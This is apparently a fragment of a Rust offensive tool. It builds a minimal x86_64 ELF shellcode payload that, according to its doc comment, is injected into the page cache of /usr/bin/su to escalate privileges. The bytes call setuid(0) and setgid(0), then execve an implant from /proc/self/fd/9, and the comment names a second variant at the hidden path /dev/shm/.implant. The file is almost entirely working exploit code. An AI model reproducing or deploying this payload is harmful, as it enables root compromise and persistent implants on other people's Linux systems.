/// Shellcode payloads — minimal x86_64 ELF binaries injected into /usr/bin/su page cache.
///
/// Two variants:
///   - `payload_exec_fd9()` — execve("/proc/self/fd/9")  (tier3: re-executes implant from fd 9)
///   - `payload_implant()`  — execve("/dev/shm/.implant") (tier2: predefined path)
///
/// Both: setuid(0) + setgid(0) then exec.

pub fn payload_exec_fd9() -> Vec<u8> {
    let code = vec![
        0x31, 0xff, 0xb8, 0x69, 0x00, 0x00, 0x00, 0x0f, 0x05, // setuid(0)
        0x31, 0xff, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x0f, 0x05, // setgid(0)
        0x48, 0x8d, 0x3d, 0x00, 0x00, 0x00, 0x00,             // lea rdi, [rip + path]
        0x31, 0xf6, 0x31, 0xd2,                               // xor esi,esi; xor edx,edx
        0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05,             // execve
        0x31, 0xff, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, // exit
    ];

    let path = b"/proc/self/fd/9\0".to_vec();
    let total = ELF_HDR.len() + PHDR.len() + code.len() + path.len();
    assert!(total <= 4096, "shellcode exceeds page");

    let mut elf = Vec::with_capacity(total);
    elf.extend_from_slice(&build_ehdr(total as u64));
    elf.extend_from_slice(&build_phdr(total as u64));
    elf.extend_from_slice(&code);
    elf.extend_from_slice(&path);

    let code_off = ELF_HDR.len() + PHDR.len();
    let rip_vaddr = 0x400078 + 9 + 9 + 7;
    let target_vaddr = 0x400000 + code_off as u64 + code.len() as u64;
    let disp = (target_vaddr as i64 - rip_vaddr as i64) as i32;
    elf[code_off + 9 + 9 + 3..code_off + 9 + 9 + 7].copy_from_slice(&disp.to_le_bytes());

    elf
}

